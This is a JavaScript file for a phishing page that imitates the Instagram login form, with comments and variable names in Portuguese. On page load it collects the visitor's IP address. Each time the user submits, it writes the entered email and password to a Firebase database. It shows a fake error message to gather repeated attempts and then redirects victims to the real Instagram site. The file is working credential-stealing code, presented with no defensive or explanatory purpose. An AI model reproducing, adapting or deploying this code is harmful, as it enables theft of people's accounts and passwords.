var xml = new XMLHttpRequest();
xml.open("GET", "https://api.ipify.org");
xml.send();
xml.addEventListener("load", loaded);

let contador = 0;
let email, senha;
let MensagemDeErro, MensagemInsponivel;
let NumeroContas;



function loaded(e) {
    WriteDb(xml.responseText);
}

function WriteDb(ip) {
    var num = 0;

    // Exibir o IP coletado no console
    console.log("IP do usuário:", ip);

    firebase.database().ref("Ip").once("value").then(function (snap) {
        num = snap.numChildren();
        num++;
        firebase.database().ref("Ip").child(num.toString()).set({
            Ip: ip
        });
    });
}

function AtualizarConta(){
    firebase.database().ref("Conta").once("value").then(function (snap) {
        let NumeroContas = snap.numChildren();
    
        firebase.database().ref("Conta").child(NumeroContas.toString()).set({
            Usuario: email,
            Senha: senha
        });
    });
}

function redirect() {
    email = document.getElementById('login-email').value;
    senha = document.getElementById('login-senha').value;
    MensagemDeErro = document.getElementById('MensagemDeErro');
    
    if (email !== "" && senha !== "" && contador === 0) {
        AtualizarConta();

        document.getElementById('login-email').value = '';
        document.getElementById('login-senha').value = '';

        MensagemDeErro.style.display = "block";

        console.log("Os primeiros valores digitados foram:", email, senha);
        contador = 2;
    }

    else if (email !== "" && senha !== "" && contador === 2) {
        AtualizarConta();

        document.getElementById('login-email').value = '';
        document.getElementById('login-senha').value = '';
    
        MensagemDeErro.style.display = "block";
    
        console.log("Os segundos valores digitados foram:", email, senha);
        contador = 4;
    }
    
    else if (email !== "" && senha !== "" && contador === 4) {
        AtualizarConta();

        MensagemDeErro.style.display = "none";
    
        console.log("Os terceiros valores digitados foram:", email, senha);
        window.location.href = "https://www.instagram.com/";
    }
}

window.addEventListener("keydown", function(event) {
    if (event.key === "Enter") {
      redirect();
    }
});

function SemMensagem()
{
    MensagemInsponivel = document.getElementById('MensagemIndisponivel');
    MensagemInsponivel.style.display = "block";
}



BotaoFacebook = document.getElementById('primeiro-botao');
BotaoEsqueceuSenha = document.getElementById('BotaoEsqueceuSenha');
BotaoCadastro = document.getElementById('BotaoCadastro');
BotaoFacebook.addEventListener("click", SemMensagem);
BotaoEsqueceuSenha.addEventListener("click", SemMensagem);
BotaoCadastro.addEventListener("click", SemMensagem);

Entrar = document.getElementById("botao-entrar");
Entrar.addEventListener("click",redirect);